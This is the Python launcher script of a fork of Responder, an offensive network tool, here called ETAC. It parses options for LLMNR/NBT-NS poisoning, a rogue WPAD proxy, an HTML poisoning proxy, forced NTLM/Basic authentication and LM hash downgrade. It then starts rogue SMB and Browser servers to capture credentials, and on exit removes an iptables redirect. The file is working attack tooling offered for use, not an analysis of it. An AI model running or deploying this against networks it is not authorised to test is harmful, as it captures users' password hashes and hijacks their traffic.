#!/usr/bin/env python
# This file was part of Responder and now is part of ETAC
# ETAC work by Felix Ryan
# Responder work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import optparse
from SocketServer import TCPServer, UDPServer, ThreadingMixIn
from threading import Thread

from utils import *

banner()

parser = optparse.OptionParser(usage='python %prog -I eth0 -w -r -f\nor:\npython %prog -I eth0 -wrf',
                               version=settings.__version__, prog=sys.argv[0])
parser.add_option('-A', '--analyze', action="store_true",
                  help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.",
                  dest="Analyze", default=False)
parser.add_option('-I', '--interface', action="store", help="Network interface to use", dest="Interface",
                  metavar="eth0", default=None)
parser.add_option('-i', '--ip', action="store", help="Local IP to use \033[1m\033[31m(only for OSX)\033[0m",
                  dest="OURIP", metavar="10.0.0.21", default=None)
parser.add_option('-b', '--basic', action="store_true", help="Return a Basic HTTP authentication. Default: NTLM",
                  dest="Basic", default=False)
parser.add_option('-r', '--wredir', action="store_true",
                  help="Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False",
                  dest="Wredirect", default=False)
parser.add_option('-d', '--NBTNSdomain', action="store_true",
                  help="Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False",
                  dest="NBTNSDomain", default=False)
parser.add_option('-f', '--fingerprint', action="store_true",
                  help="This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.",
                  dest="Finger", default=False)
parser.add_option('-w', '--wpad', action="store_true", help="Start the WPAD rogue proxy server. Default value is False",
                  dest="WPAD_On_Off", default=False)
parser.add_option('-H', '--html-poisoner', action="store_true",
                  help="Enable the HTML poisoning proxy. Default value is False", dest="HTML_On_Off", default=False)
parser.add_option('-u', '--upstream-proxy', action="store",
                  help="Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)",
                  dest="Upstream_Proxy", default=None)
parser.add_option('-F', '--ForceWpadAuth', action="store_true",
                  help="Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False",
                  dest="Force_WPAD_Auth", default=False)
parser.add_option('--lm', action="store_true",
                  help="Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False", dest="LM_On_Off",
                  default=False)
parser.add_option('-v', '--verbose', action="store_true", help="Increase verbosity.", dest="Verbose")
options, args = parser.parse_args()

if not os.geteuid() == 0:
    print color("[!] Responder must be run as root.")
    sys.exit(-1)

if options.OURIP is None and IsOsX() is True:
    print "\n\033[1m\033[31mOSX detected, -i mandatory option is missing\033[0m\n"
    parser.print_help()
    exit(-1)

settings.init()
settings.Config.populate(options)

StartupMessage()

settings.Config.ExpandIPRanges()


class ThreadingUDPServer(ThreadingMixIn, UDPServer):
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To + '\0')
            except:
                pass
        UDPServer.server_bind(self)


class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To + '\0')
            except:
                pass
        TCPServer.server_bind(self)


ThreadingUDPServer.allow_reuse_address = 1
ThreadingTCPServer.allow_reuse_address = 1


def serve_thread_udp_broadcast(host, port, handler):
    try:
        server = ThreadingUDPServer(('', port), handler)
        server.serve_forever()
    except:
        print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(
            port) + ", check permissions or other servers running."


def serve_thread_udp(host, port, handler):
    try:
        if OsInterfaceIsSupported():
            server = ThreadingUDPServer((settings.Config.Bind_To, port), handler)
            server.serve_forever()
        else:
            server = ThreadingUDPServer((host, port), handler)
            server.serve_forever()
    except:
        print color("[!] ", 1, 1) + "Error starting UDP server on port " + str(
            port) + ", check permissions or other servers running."


def serve_thread_tcp(host, port, handler):
    try:
        if OsInterfaceIsSupported():
            server = ThreadingTCPServer((settings.Config.Bind_To, port), handler)
            server.serve_forever()
        else:
            server = ThreadingTCPServer((host, port), handler)
            server.serve_forever()
    except:
        print color("[!] ", 1, 1) + "Error starting TCP server on port " + str(
            port) + ", check permissions or other servers running."


def main():
    try:
        threads = []

        # Load HTML Poisoner
        if settings.Config.HTML_On_Off:
            from poisoners import HTML
            threads.append(Thread(target=HTML.main))

        # Load Browser Listener
        from servers.Browser import Browser
        threads.append(Thread(target=serve_thread_udp_broadcast, args=('', 138, Browser,)))

        if settings.Config.SMB_On_Off:
            if settings.Config.LM_On_Off:
                from servers.SMB import SMB1LM
                threads.append(Thread(target=serve_thread_tcp, args=('', 445, SMB1LM,)))
                threads.append(Thread(target=serve_thread_tcp, args=('', 139, SMB1LM,)))
            else:
                from servers.SMB import SMB1
                threads.append(Thread(target=serve_thread_tcp, args=('', 445, SMB1,)))
                threads.append(Thread(target=serve_thread_tcp, args=('', 139, SMB1,)))

        for thread in threads:
            thread.setDaemon(True)
            thread.start()

        print color('[+]', 2, 1) + " Listening for events..."

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        if settings.Config.HTML_On_Off:
            # remove the IPtables redirect rule
            os.system('iptables -D PREROUTING -t nat -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 3128')
        HTML.sys.exit("\r%s Exiting..." % color('[+]', 2, 1))


if __name__ == '__main__':
    main()
